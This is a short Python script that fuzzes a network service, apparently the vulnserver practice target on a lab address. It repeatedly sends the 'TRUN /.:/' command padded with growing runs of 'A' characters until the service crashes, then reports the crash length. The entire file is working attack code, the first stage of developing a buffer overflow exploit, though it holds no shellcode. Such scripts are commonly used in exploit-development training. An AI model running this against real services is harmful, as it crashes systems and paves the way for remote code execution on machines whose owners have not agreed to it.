import socket
from time import sleep
import sys

numOfChar=300
stringToSend="TRUN /.:/"+ "A"*numOfChar

while True:
    try:
        mySocket= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        mySocket.connect(("10.0.2.4",9999))
        byteOfString=stringToSend.encode(encoding="latin1")
        mySocket.send(byteOfString)
        mySocket.close()

        stringToSend=stringToSend+"A"*numOfChar
        sleep(1)

    except KeyboardInterrupt:
        print("Crash point: "+str(len(stringToSend)))
        sys.exit()

    except Exception as e:
        print("Crash point: "+str(len(stringToSend)))
        print(e)
        sys.exit()
